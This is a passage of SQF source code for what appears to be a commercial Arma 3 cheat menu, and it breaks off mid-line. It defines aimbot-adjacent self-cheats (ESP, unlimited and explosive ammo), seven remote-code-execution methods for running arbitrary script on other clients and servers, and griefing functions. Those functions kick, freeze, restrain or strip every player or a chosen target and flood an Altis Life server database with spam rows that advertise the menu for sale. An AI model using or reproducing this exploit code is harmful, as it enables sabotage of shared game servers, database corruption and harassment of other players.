        ['NO FATIGUE',{hint'No fatigue on';player enableFatigue false},{hint'No fatigue off';player enableFatigue true}],
        ['NO RECOIL',{hint'No recoil on';player setUnitRecoilCoefficient 0},{hint'No recoil off';player setUnitRecoilCoefficient 1}],
        ['UNLIMITED AMMO',{hint'Unlimited Ammo activated';[]spawn{waitUntil{(vehicle player)setVehicleAmmo 1;(player getVariable['++++++++++++++++#',false])}}},{hint'Unlimited Ammo deactivated';(player setVariable['++++++++++++++++#',true])}],
        ['EXPLOSIVE AMMO',{hint'Explosive Ammo activated';(vehicle player)removeAllEventHandlers'Fired';(vehicle player)addEventHandler['Fired',{_1='R_PG32V_F'createVehicleLocal[0,0,0];_2=velocity(_this select 6);_3=direction(_this select 6);_4=getPosASL(_this select 6);deleteVehicle(_this select 6);_1 setPosASL _4;_1 setDir _3;_1 setVelocity _2}]},{hint'Explosive Ammo deactivated';(vehicle player)removeAllEventHandlers'Fired'}],
        ['PLAYER ESP',{hint'Player Esp on';addMissionEventHandler['Draw3D',{{if((player distance _x)<700)then{drawIcon3D['',[0,1,0,1],[(ASLtoATL eyePos _x)select 0,(ASLtoATL eyePos _x)select 1,((ASLtoATL eyePos _x)select 2)+0.3],0.1,0.1,45,format['%1(%2m) - %3HP',name _x,round(player distance _x),round((((damage _x)-1)*-100))],1,0.03,'PuristaSemiBold']}}forEach allPlayers}];},{hint'Player Esp off';removeAllMissionEventHandlers'Draw3D'}],
        ['MAP MARKER',{hint'Map Marker on';((finddisplay 12)displayCtrl 51)ctrlAddEventHandler ['Draw',{_2=_this select 0;{if(true)then{_3=if(vehicle _x==_x)then{name _x}else{_1='(';{_1=_1+(if(_forEachIndex==0)then{''}else{', '})+name _x}forEach(crew(vehicle _x));_1=_1+')';format['%1%2',getText(configFile>>'CfgVehicles'>>typeOf(vehicle _x)>>'displayName'),_1]};_4=if(vehicle _x==_x)then{'iconMan'}else{switch(true)do{case((vehicle _x)isKindOf'Man'):{'iconman'};case((vehicle _x)isKindOf'Car'):{'iconcar'};case((vehicle _x)isKindOf'Tank'):{'iconcar'};case((vehicle _x)isKindOf'Air'):{'iconhelicopter'};case((vehicle _x)isKindOf'Ship'):{'iconship'}}};_5=switch(side _x)do{case BLUFOR:{[0,0.298,0.596,1]};case OPFOR:{[0.502,0,0,1]};case INDEPENDENT:{[0,0.502,0,1]};case CIVILIAN:{[0.4,0,0.502,1]};case default{[0.996,0.655,0.114,1]}};_2 drawIcon[_4,_5,getPos _x,24,24,getDir _x,_3,1,0.025,'PuristaMedium','right']}}forEach allPlayers}]},{hint'Map Marker off';((finddisplay 12)displayCtrl 51)ctrlRemoveAllEventHandlers'Draw'}],
        ["KIT CIVILIAN",{removeAllWeapons player;removeAllItems player;removeAllAssignedItems player;removeUniform player;removeVest player;removeBackpack player;removeHeadgear player;removeGoggles player;player forceAddUniform'U_BG_Guerilla2_3';for'_i'from 1 to 3 do{player addItemToUniform'16Rnd_9x21_Mag'};player addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{player addItemToBackpack'FirstAidKit'};player addItemToBackpack'ToolKit';for'_i'from 1 to 17 do{player addItemToBackpack'30Rnd_9x21_Red_Mag'};for'_i'from 1 to 7 do{player addItemToBackpack'Chemlight_blue'};player addHeadgear'H_Hat_checker';player addGoggles'G_Squares';player addWeapon'hgun_PDW2000_F';player addPrimaryWeaponItem'optic_Aco';player addWeapon'hgun_Rook40_F';player linkItem'ItemMap';player linkItem'ItemCompass';player linkItem'ItemWatch'}],
        ["KIT REPORTER",{removeAllWeapons player;removeAllItems player;removeAllAssignedItems player;removeUniform player;removeVest player;removeBackpack player;removeHeadgear player;removeGoggles player;player forceAddUniform'U_C_Journalist';player addVest'V_Press_F';player addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{player addItemToBackpack'FirstAidKit'};player addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{player addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 10 do{player addItemToBackpack'SmokeShellBlue'};for'_i'from 1 to 12 do{player addItemToBackpack'30Rnd_9x21_Yellow_Mag'};player addHeadgear'H_Cap_press';player addGoggles'G_Aviator';player addWeapon'hgun_Rook40_F';player addWeapon'Binocular';player linkItem'ItemMap';player linkItem'ItemCompass';player linkItem'ItemWatch';player linkItem'NVGoggles_OPFOR';player setFace'WhiteHead_05';player setSpeaker'Male01GRE'}],
        ["KIT COP",{removeAllWeapons player;removeAllItems player;removeAllAssignedItems player;removeUniform player;removeVest player;removeBackpack player;removeHeadgear player;removeGoggles player;player forceAddUniform'U_Marshal';for'_i'from 1 to 2 do{player addItemToUniform'16Rnd_9x21_Mag'};player addVest'V_TacVest_blk_POLICE';for'_i'from 1 to 3 do{player addItemToVest'20Rnd_762x51_Mag'};player addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{player addItemToBackpack'FirstAidKit'};player addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{player addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 10 do{player addItemToBackpack'SmokeShellBlue'};player addItemToBackpack'16Rnd_9x21_Mag';player addHeadgear'H_Beret_02';player addGoggles'G_Aviator';player addWeapon'srifle_EBR_F';player addPrimaryWeaponItem'acc_pointer_IR';player addPrimaryWeaponItem'optic_Hamr';player addWeapon'hgun_P07_F';player addHandgunItem'muzzle_snds_L';player addWeapon'Rangefinder';player linkItem'ItemMap';player linkItem'ItemCompass';player linkItem'ItemWatch';player linkItem'NVGoggles_OPFOR';player setFace'WhiteHead_05';player setSpeaker'Male01GRE'}],
        ["KIT SNIPER",{removeAllWeapons player;removeAllItems player;removeAllAssignedItems player;removeUniform player;removeVest player;removeBackpack player;removeHeadgear player;removeGoggles player;player forceAddUniform'U_O_GhillieSuit';for'_i'from 1 to 2 do{player addItemToUniform'16Rnd_9x21_Mag'};player addVest'V_TacVest_camo';for'_i'from 1 to 3 do{player addItemToVest'5Rnd_127x108_Mag'};player addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{player addItemToBackpack'FirstAidKit'};player addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{player addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 5 do{player addItemToBackpack'SmokeShellBlue'};for'_i'from 1 to 5 do{player addItemToBackpack'16Rnd_9x21_Mag'};for'_i'from 1 to 8 do{player addItemToBackpack'5Rnd_127x108_APDS_Mag'};player addGoggles'G_Aviator';player addWeapon'srifle_GM6_F';player addPrimaryWeaponItem'optic_Hamr';player addWeapon'hgun_P07_F';player addHandgunItem'muzzle_snds_L';player addWeapon'Rangefinder';player linkItem'ItemMap';player linkItem'ItemCompass';player linkItem'ItemWatch';player linkItem'NVGoggles';player setFace'WhiteHead_05';player setSpeaker'Male01GRE'}],
        ["KIT REBEL",{removeAllWeapons player;removeAllItems player;removeAllAssignedItems player;removeUniform player;removeVest player;removeBackpack player;removeHeadgear player;removeGoggles player;player forceAddUniform'U_I_G_resistanceLeader_F';for'_i'from 1 to 3 do{player addItemToUniform'30Rnd_65x39_caseless_green'};player addVest'V_TacVest_khk';player addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{player addItemToBackpack'FirstAidKit'};player addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{player addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 5 do{player addItemToBackpack'SmokeShellBlue'};for'_i'from 1 to 10 do{player addItemToBackpack'6Rnd_45ACP_Cylinder'};for'_i'from 1 to 10 do{player addItemToBackpack'30Rnd_65x39_caseless_green'};player addHeadgear'H_ShemagOpen_khk';player addGoggles'G_Aviator';player addWeapon'arifle_Katiba_F';player addPrimaryWeaponItem'optic_Hamr';player addWeapon'hgun_Pistol_heavy_02_F';player addHandgunItem'optic_Yorris';player addWeapon'Rangefinder';player linkItem'ItemMap';player linkItem'ItemCompass';player linkItem'ItemWatch';player linkItem'NVGoggles';player setFace'WhiteHead_05';player setSpeaker'Male01GRE'}],
        ["KIT HACKER",{removeAllWeapons player;removeAllItems player;removeAllAssignedItems player;removeUniform player;removeVest player;removeBackpack player;removeHeadgear player;removeGoggles player;player forceAddUniform'U_C_Scientist';player addItemToUniform'10Rnd_338_Mag';player addVest'V_TacVest_camo';for'_i'from 1 to 7 do{player addItemToVest'10Rnd_338_Mag'};player addBackpack'B_Carryall_oucamo';for'_i'from 1 to 5 do{player addItemToBackpack'FirstAidKit'};player addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{player addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 5 do{player addItemToBackpack'SmokeShellBlue'};player addItemToBackpack'Titan_AA';for'_i'from 1 to 5 do{player addItemToBackpack'6Rnd_GreenSignal_F'};player addHeadgear'H_RacingHelmet_1_blue_F';player addGoggles'G_Aviator';player addWeapon'srifle_DMR_02_F';player addPrimaryWeaponItem'muzzle_snds_338_black';player addPrimaryWeaponItem'acc_pointer_IR';player addPrimaryWeaponItem'optic_tws_mg';player addPrimaryWeaponItem'bipod_01_F_blk';player addWeapon'launch_I_Titan_F';player addWeapon'hgun_Pistol_Signal_F';player addWeapon'Rangefinder';player linkItem'ItemMap';player linkItem'ItemCompass';player linkItem'ItemWatch';player linkItem'NVGoggles_OPFOR';player setFace'WhiteHead_05';player setSpeaker'Male01GRE'}],
        ["HINT HOTKEYS",{hint parseText "<t color=""#3CA6A6"" size=""1"">END  = Show Hotkeys</t><br/> <t color=""#3CA6A6"" size=""1"">Num0  = Revive Self</t><br/> <t color=""#3CA6A6"" size=""1"">Num1  = Delete CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num2  = Heal CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num3  = Kill CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num4  = Revive CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num5  = Restraine CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num6  = Explode CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num7  = Strip Down CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num8  = Speedhack ON/OFF</t><br/> <t color=""#3CA6A6"" size=""1"">Num9  = Get keys</t><br/>H = Open ATM"}]
    ];
    _FUNCTIONS_REMOTE=[
        ['USE RE #1 remoteExec',{hint'Switched to RE #1';profileNamespace setVariable['MAIN_RE',{_this remoteExec["BIS_FNC_SPAWN",0]}]}],
        ['USE RE #2 BIS_FNC_MP',{hint'Switched to RE #2';profileNamespace setVariable['MAIN_RE',{[_this,"BIS_FNC_SPAWN",true,false]call BIS_FNC_MP}]}],
        ['USE RE #3 BIS_FNC_EXECREMOTE',{hint'Switched to RE #3';profileNamespace setVariable['MAIN_RE',{[_this,"BIS_FNC_SPAWN",true,false]call BIS_FNC_EXECREMOTE}]}],
        ['USE RE #4 addMPEventHandler',{hint'Switched to RE #4';profileNamespace setVariable['MAIN_RE',{_1=(typeOf player)createVehicle[0,0,0];_1 addMPEventHandler["MPKilled",_this];_1 setDamage 1}]}],
        ['USE RE #5 publicVariable',{hint'Switched to RE #5';profileNamespace setVariable['MAIN_RE',{life_fnc_MP_packet={call _this};publicVariable"life_fnc_MP_packet";uiSleep 1;[(_this),"life_fnc_MP_packet",true,false]spawn BIS_fnc_MP}]}],
        ['USE RE #6 createUnit',{hint'Switched to RE #6';profileNamespace setVariable['MAIN_RE',{(typeOf player)createUnit[[0,0,0],(createGroup east),";"+"[]spawn"+str(_this)+";",0.5,"CORPORAL"]}]}],
        ['USE RE #7 BIS_fnc_addScriptedEventHandler',{hint'Switched to RE #7';profileNamespace setVariable['MAIN_RE',{_2=_this;if(typename _2=="CODE")then{_1=toArray str(_2);_1 set[0, 32];_1 set[count(_1)-1,32];_2=toString _1};_2=format["[]spawn toString%1", toArray _2];[[player,"Execute",format["[]spawn{call compileFinal toString%1}",toArray _2]],"BIS_fnc_addScriptedEventHandler",true,false]call BIS_fnc_MP;[[player,"Execute",[]],"BIS_fnc_callScriptedEventHandler",true,false]call BIS_fnc_MP;[[player,"Execute"],"BIS_fnc_removeAllScriptedEventHandlers",true,false]call BIS_fnc_MP}]}]
    ];
    _FUNCTIONS_LIFE=[
        ['ADD RANDOM CASH $',{hint'Added CASH $';_1=call{_1=if((loadFile'script_macros.hpp')!='')then{0}else{1};switch(_1)do{case 0:{_2=loadFile'script_macros.hpp';_3=_2 find'#define CASH ';_4=_2 select[_3+13,count(toArray _2)]find'#define';(_2 select[_3+13,_4-1])};case 1:{_1=loadFile'core\civilian\fn_robReceive.sqf';_2=_1 select[(_1 find' = ')+3,count(toArray _1)];_3=_1 select[(_2 find' = ')+(_1 find' = ')+3,count(toArray _1)];_4=_3 find' + _cash;';_5=_3 select[3,_4-3];_5};};};missionNamespace setVariable[_1,(missionNamespace getVariable _1)+100.000+random(150000)]}],
        ['FILL DATABASE',{hint'Filling the Database...';for'_i'from 0 to 1337 do{[[format["[%1]DATABASE HACKED BY ARMA.TEAM",_i],'BUY OUR MENU - selly.gg/@arma',1337,1337,(allMissionObjects'Building')select 0],"DB_fnc_insertRequest",true,false]call life_fnc_MP};hint'Filled the database'}],
        ['UNRESTRAIN',{hint'Unrestrained';player setVariable['restrained',false,true]}],
        ['ANTI RESTRAIN',{hint'Anti-Restrain on';[]spawn{while{player getVariable['########################',true]}do{player setVariable['restrained',false,true];sleep 1}}},{hint'AntiRestrain off';player setVariable['########################',false]}],
        ['ANTI TAZER',{hint'Anti-Tazer on';[]spawn{while{player getVariable['#######################',true]}do{life_istazed=false;sleep 1}}},{hint'Anti-Tazer off';player setVariable['########################',false]}],
        ['GET ALL KEYS',{hint'Got all keys';{life_vehicles pushBack _x}forEach(allMissionObjects'Air'+allMissionObjects'Car'+allMissionObjects'Ship')}]
    ];

    _FUNCTIONS_TROLLING=[
        ['CASH RAIN',{hint'Please select a position on the map to start the cash rain!';onMapSingleClick{onMapSingleClick{};hint'The cash is incoming...';openMap[false,false];for'_1'from 0 to 150 do{_2="Land_Money_F"createVehicle[0,0,0];_2 setVariable["item",["money",1333337],true];_2 setPos[(_pos select 0)+(random 50),(_pos select 1)+(random 50),400]}}}],
        ['ROCKET RAIN',{hint'Please select a position on the map to start the rocket rain!';onMapSingleClick{onMapSingleClick{};hint'The rockets are incoming...';openMap[false,false];for'_1'from 0 to 150 do{_2="R_PG32V_F"createVehicle[0,0,0];_2 setPos[(_pos select 0)+(random 50),(_pos select 1)+(random 50),100]}}}],
        ['DUMMY RAIN',{hint'Please select a position on the map to start the dummy rain!';onMapSingleClick{	onMapSingleClick{};hint'The dummys are incoming...';openMap[false,false];for'_1'from 0 to 150 do{_2=createAgent [(typeOf player), [0,0,0], [], 0, "NONE"];_2 setPos[(_pos select 0)+(random 50),(_pos select 1)+(random 50),400]}}}],
        ['BLOW EVERYONE UP',{{('HelicopterExploBig'createVehicleLocal[0,0,0])setPosASL eyePos _x}forEach allPlayers}],
        ['LAUNCH EVERYONE (RE)',{[{player setVelocity[0,0,100]}]call(profileNamespace getVariable'MAIN_RE')}],
        ['TELEPORT EVERYONE',{[]spawn{_a='C_SUV_01_F'createVehicle(position player);{_x action["GetOut",vehicle _x];_x action["GetInCargo",_a];waitUntil{vehicle _x!=_x};_x action["GetOut",vehicle _x]}forEach allPlayers}}],
        ['ENDMISSION EVERYONE (RE)',{[{endMission "endDefault"}]call(profileNamespace getVariable'MAIN_RE')}],
        ['PARACHUTE EVERYONE',{{_x addBackpackGlobal'B_Parachute';_x setPos[getPos _x select 0,getPos _x select 1,1000]}forEach allPlayers}],
        ['EJECT EVERYONE',{{_x action['GetOut',vehicle player]}forEach allPlayers}],
        ['STRIPDOWN EVERYONE',{{_1=_x;{_1 removeWeaponGlobal _x}forEach weapons _x;removeAllItems _x;removeAllAssignedItems _x;removeUniform _x;removeVest _x;removeBackpack _x;removeHeadgear _x;removeGoggles _x}forEach allPlayers}],
        ['RESTRAIN EVERYONE',{{_1=_x;_1 setVariable['realname','Bastian Suter',true];_1 setVariable['restrained',true,true];[[_1],'life_fnc_restrain',_1,false]call life_fnc_MP}forEach allPlayers}]
    ];

    _FUNCTIONS_TARGET=[
        ['TELEPORT TO TARGET',{player setPosASL getPosASL(objectFromNetId(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503))))}],
        ['TELEPORT TARGET TO ME',{(objectFromNetId(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503))))setPosASL getPosASL player}],
        ['BLOW TARGET UP',{_1="HelicopterExploBig"createVehicleLocal[0,0,0];_1 setPosASL eyePos(objectFromNetId(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503))))}],
        ['KICK TARGET',{(objectFromNetId(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503))))setPos[1e14,1e14,1e14]}],
        ['FREEZE TARGET (RE)',{(compile format['if(player!=objectFromNetId"%1")exitWith{};disableUserInput true',(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503)))])call(profileNamespace getVariable'MAIN_RE')}],
        ['ENDMISSION TARGET (RE)',{[compile format['if(player!=objectFromNetID"%1")exitWith{};endMission"endDefault"',(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503)))]]call(profileNamespace getVariable'MAIN_RE')}],
        ['STRIPDOWN TARGET',{_1=(objectFromNetId(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503))));{_1 removeWeaponGlobal _x}forEach weapons _1;removeAllItems _1;removeAllAssignedItems _1;removeUniform _1;removeVest _1;removeBackpack _1;removeHeadgear _1;removeGoggles _1}],
        ['RESTRAIN TARGET',{_1=(objectFromNetId(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503))));_1 setVariable['realname','Bastian Suter',true];_1 setVariable['restrained',true,true];[[_1],'life_fnc_restrain',_1,false]call life_fnc_MP}],
        ['REVIVE TARGET',{_1=(objectFromNetId(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503))));_1 setVariable['realname','Bastian Suter',true];[[_1],'life_fnc_reviveplayer',_1,false]call life_fnc_MP}]
    ];

    _FUNCTIONS_DUMMY=[
        ['SPAWN DUMMY',{
            []spawn{
                _1=(createAgent["C_man_1",position player,[],0,"SAFE"]);
                player setVariable['Dummy',_1];
                _1 setVariable['realname','Bastian Suter',true];
                _1 addAction['DUMMY GODMODE ON',{hint'DummyGodmode activated';(player getVariable'Dummy') removeAllEventHandlers'HandleDamage';(player getVariable'Dummy') addEventHandler['HandleDamage',{false}]}];
                _1 addAction['DUMMY GODMODE OFF',{hint'Godmode deactivated';(player getVariable'Dummy') removeAllEventHandlers'HandleDamage'}];
                _1 addAction['DUMMY RAPID FIRE ON',{vehicle(player getVariable'Dummy')setWeaponReloadingTime[vehicle(player getVariable'Dummy'),currentWeapon vehicle(player getVariable'Dummy'),0]}];
                _1 addAction['DUMMY RAPID FIRE OFF',{hint'Rapid Fire deactivated';vehicle (player getVariable'Dummy') setWeaponReloadingTime[vehicle (player getVariable'Dummy'),currentWeapon (player getVariable'Dummy'),1]}];
                _1 addAction['DUMMY NO RECOIL ON',{hint'No recoil on';(player getVariable'Dummy')setUnitRecoilCoefficient 0}];
                _1 addAction['DUMMY NO RECOIL OFF',{hint'No recoil off';(player getVariable'Dummy')setUnitRecoilCoefficient 1}];
                _1 addAction['UNLIMITED AMMO ON',{hint'Unlimited Ammo activated';[]spawn{waitUntil{(vehicle(player getVariable'Dummy'))setVehicleAmmo 1;((player getVariable'Dummy')getVariable['++++++++++++++++#',false])}}}],
                _1 addAction['UNLIMITED AMMO OFF',{hint'Unlimited Ammo deactivated';((player getVariable'Dummy')setVariable['++++++++++++++++#',true])}],
                _1 addAction['DUMMY TELEPORT',{hint'Click on the map to teleport';openMap[true,false];onMapSingleClick{onMapSingleClick{};openMap[false,false];(player getVariable'Dummy') setPos _pos;hint('Teleportet: '+str(_pos))}}];
                _1 addAction['KIT CIVILIAN',{removeAllWeapons (player getVariable'Dummy');removeAllItems (player getVariable'Dummy');removeAllAssignedItems (player getVariable'Dummy');removeUniform (player getVariable'Dummy');removeVest (player getVariable'Dummy');removeBackpack (player getVariable'Dummy');removeHeadgear (player getVariable'Dummy');removeGoggles (player getVariable'Dummy');(player getVariable'Dummy') forceAddUniform'U_BG_Guerilla2_3';for'_i'from 1 to 3 do{(player getVariable'Dummy') addItemToUniform'16Rnd_9x21_Mag'};(player getVariable'Dummy') addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'FirstAidKit'};(player getVariable'Dummy') addItemToBackpack'ToolKit';for'_i'from 1 to 17 do{(player getVariable'Dummy') addItemToBackpack'30Rnd_9x21_Red_Mag'};for'_i'from 1 to 7 do{(player getVariable'Dummy') addItemToBackpack'Chemlight_blue'};(player getVariable'Dummy') addHeadgear'H_Hat_checker';(player getVariable'Dummy') addGoggles'G_Squares';(player getVariable'Dummy') addWeapon'hgun_PDW2000_F';(player getVariable'Dummy') addPrimaryWeaponItem'optic_Aco';(player getVariable'Dummy') addWeapon'hgun_Rook40_F';(player getVariable'Dummy') linkItem'ItemMap';(player getVariable'Dummy') linkItem'ItemCompass';(player getVariable'Dummy') linkItem'ItemWatch'}];
                _1 addAction['KIT REPORTER',{removeAllWeapons (player getVariable'Dummy');removeAllItems (player getVariable'Dummy');removeAllAssignedItems (player getVariable'Dummy');removeUniform (player getVariable'Dummy');removeVest (player getVariable'Dummy');removeBackpack (player getVariable'Dummy');removeHeadgear (player getVariable'Dummy');removeGoggles (player getVariable'Dummy');(player getVariable'Dummy') forceAddUniform'U_C_Journalist';(player getVariable'Dummy') addVest'V_Press_F';(player getVariable'Dummy') addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'FirstAidKit'};(player getVariable'Dummy') addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{(player getVariable'Dummy') addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 10 do{(player getVariable'Dummy') addItemToBackpack'SmokeShellBlue'};for'_i'from 1 to 12 do{(player getVariable'Dummy') addItemToBackpack'30Rnd_9x21_Yellow_Mag'};(player getVariable'Dummy') addHeadgear'H_Cap_press';(player getVariable'Dummy') addGoggles'G_Aviator';(player getVariable'Dummy') addWeapon'hgun_Rook40_F';(player getVariable'Dummy') addWeapon'Binocular';(player getVariable'Dummy') linkItem'ItemMap';(player getVariable'Dummy') linkItem'ItemCompass';(player getVariable'Dummy') linkItem'ItemWatch';(player getVariable'Dummy') linkItem'NVGoggles_OPFOR';(player getVariable'Dummy') setFace'WhiteHead_05';(player getVariable'Dummy') setSpeaker'Male01GRE'}];
                _1 addAction['KIT COP',{removeAllWeapons (player getVariable'Dummy');removeAllItems (player getVariable'Dummy');removeAllAssignedItems (player getVariable'Dummy');removeUniform (player getVariable'Dummy');removeVest (player getVariable'Dummy');removeBackpack (player getVariable'Dummy');removeHeadgear (player getVariable'Dummy');removeGoggles (player getVariable'Dummy');(player getVariable'Dummy') forceAddUniform'U_Marshal';for'_i'from 1 to 2 do{(player getVariable'Dummy') addItemToUniform'16Rnd_9x21_Mag'};(player getVariable'Dummy') addVest'V_TacVest_blk_POLICE';for'_i'from 1 to 3 do{(player getVariable'Dummy') addItemToVest'20Rnd_762x51_Mag'};(player getVariable'Dummy') addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'FirstAidKit'};(player getVariable'Dummy') addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{(player getVariable'Dummy') addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 10 do{(player getVariable'Dummy') addItemToBackpack'SmokeShellBlue'};(player getVariable'Dummy') addItemToBackpack'16Rnd_9x21_Mag';(player getVariable'Dummy') addHeadgear'H_Beret_02';(player getVariable'Dummy') addGoggles'G_Aviator';(player getVariable'Dummy') addWeapon'srifle_EBR_F';(player getVariable'Dummy') addPrimaryWeaponItem'acc_pointer_IR';(player getVariable'Dummy') addPrimaryWeaponItem'optic_Hamr';(player getVariable'Dummy') addWeapon'hgun_P07_F';(player getVariable'Dummy') addHandgunItem'muzzle_snds_L';(player getVariable'Dummy') addWeapon'Rangefinder';(player getVariable'Dummy') linkItem'ItemMap';(player getVariable'Dummy') linkItem'ItemCompass';(player getVariable'Dummy') linkItem'ItemWatch';(player getVariable'Dummy') linkItem'NVGoggles_OPFOR';(player getVariable'Dummy') setFace'WhiteHead_05';(player getVariable'Dummy') setSpeaker'Male01GRE'}];
                _1 addAction['KIT SNIPER',{removeAllWeapons (player getVariable'Dummy');removeAllItems (player getVariable'Dummy');removeAllAssignedItems (player getVariable'Dummy');removeUniform (player getVariable'Dummy');removeVest (player getVariable'Dummy');removeBackpack (player getVariable'Dummy');removeHeadgear (player getVariable'Dummy');removeGoggles (player getVariable'Dummy');(player getVariable'Dummy') forceAddUniform'U_O_GhillieSuit';for'_i'from 1 to 2 do{(player getVariable'Dummy') addItemToUniform'16Rnd_9x21_Mag'};(player getVariable'Dummy') addVest'V_TacVest_camo';for'_i'from 1 to 3 do{(player getVariable'Dummy') addItemToVest'5Rnd_127x108_Mag'};(player getVariable'Dummy') addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'FirstAidKit'};(player getVariable'Dummy') addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{(player getVariable'Dummy') addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'SmokeShellBlue'};for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'16Rnd_9x21_Mag'};for'_i'from 1 to 8 do{(player getVariable'Dummy') addItemToBackpack'5Rnd_127x108_APDS_Mag'};(player getVariable'Dummy') addGoggles'G_Aviator';(player getVariable'Dummy') addWeapon'srifle_GM6_F';(player getVariable'Dummy') addPrimaryWeaponItem'optic_Hamr';(player getVariable'Dummy') addWeapon'hgun_P07_F';(player getVariable'Dummy') addHandgunItem'muzzle_snds_L';(player getVariable'Dummy') addWeapon'Rangefinder';(player getVariable'Dummy') linkItem'ItemMap';(player getVariable'Dummy') linkItem'ItemCompass';(player getVariable'Dummy') linkItem'ItemWatch';(player getVariable'Dummy') linkItem'NVGoggles';(player getVariable'Dummy') setFace'WhiteHead_05';(player getVariable'Dummy') setSpeaker'Male01GRE'}];
                _1 addAction['KIT REBEL',{removeAllWeapons (player getVariable'Dummy');removeAllItems (player getVariable'Dummy');removeAllAssignedItems (player getVariable'Dummy');removeUniform (player getVariable'Dummy');removeVest (player getVariable'Dummy');removeBackpack (player getVariable'Dummy');removeHeadgear (player getVariable'Dummy');removeGoggles (player getVariable'Dummy');(player getVariable'Dummy') forceAddUniform'U_I_G_resistanceLeader_F';for'_i'from 1 to 3 do{(player getVariable'Dummy') addItemToUniform'30Rnd_65x39_caseless_green'};(player getVariable'Dummy') addVest'V_TacVest_khk';(player getVariable'Dummy') addBackpack'B_Carryall_khk';for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'FirstAidKit'};(player getVariable'Dummy') addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{(player getVariable'Dummy') addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'SmokeShellBlue'};for'_i'from 1 to 10 do{(player getVariable'Dummy') addItemToBackpack'6Rnd_45ACP_Cylinder'};for'_i'from 1 to 10 do{(player getVariable'Dummy') addItemToBackpack'30Rnd_65x39_caseless_green'};(player getVariable'Dummy') addHeadgear'H_ShemagOpen_khk';(player getVariable'Dummy') addGoggles'G_Aviator';(player getVariable'Dummy') addWeapon'arifle_Katiba_F';(player getVariable'Dummy') addPrimaryWeaponItem'optic_Hamr';(player getVariable'Dummy') addWeapon'hgun_Pistol_heavy_02_F';(player getVariable'Dummy') addHandgunItem'optic_Yorris';(player getVariable'Dummy') addWeapon'Rangefinder';(player getVariable'Dummy') linkItem'ItemMap';(player getVariable'Dummy') linkItem'ItemCompass';(player getVariable'Dummy') linkItem'ItemWatch';(player getVariable'Dummy') linkItem'NVGoggles';(player getVariable'Dummy') setFace'WhiteHead_05';(player getVariable'Dummy') setSpeaker'Male01GRE'}];
                _1 addAction['KIT HACKER',{removeAllWeapons (player getVariable'Dummy');removeAllItems (player getVariable'Dummy');removeAllAssignedItems (player getVariable'Dummy');removeUniform (player getVariable'Dummy');removeVest (player getVariable'Dummy');removeBackpack (player getVariable'Dummy');removeHeadgear (player getVariable'Dummy');removeGoggles (player getVariable'Dummy');(player getVariable'Dummy') forceAddUniform'U_C_Scientist';(player getVariable'Dummy') addItemToUniform'10Rnd_338_Mag';(player getVariable'Dummy') addVest'V_TacVest_camo';for'_i'from 1 to 7 do{(player getVariable'Dummy') addItemToVest'10Rnd_338_Mag'};(player getVariable'Dummy') addBackpack'B_Carryall_oucamo';for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'FirstAidKit'};(player getVariable'Dummy') addItemToBackpack'ToolKit';for'_i'from 1 to 7 do{(player getVariable'Dummy') addItemToBackpack'Chemlight_blue'};for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'SmokeShellBlue'};(player getVariable'Dummy') addItemToBackpack'Titan_AA';for'_i'from 1 to 5 do{(player getVariable'Dummy') addItemToBackpack'6Rnd_GreenSignal_F'};(player getVariable'Dummy') addHeadgear'H_RacingHelmet_1_blue_F';(player getVariable'Dummy') addGoggles'G_Aviator';(player getVariable'Dummy') addWeapon'srifle_DMR_02_F';(player getVariable'Dummy') 